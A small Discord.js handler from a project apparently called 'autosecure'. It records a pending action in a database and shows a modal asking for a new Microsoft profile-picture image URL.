const { TextInputStyle } = require("discord.js");
const generate = require("../../utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "changepfpautosecure",
    editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");
        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `modalchangepfp|${botnumber}|${ownerid}`]
        );
        let customModalId = `action|${actionId}`




        interaction.showModal(modalBuilder(
            customModalId,
            `Change Microsoft PFP`,
            [
                {
                    setCustomId: 'pfpurl',
                    setRequired: false,
                    setLabel: 'Enter the new image URL',
                    setPlaceholder: 'https://example.com/image.png',
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
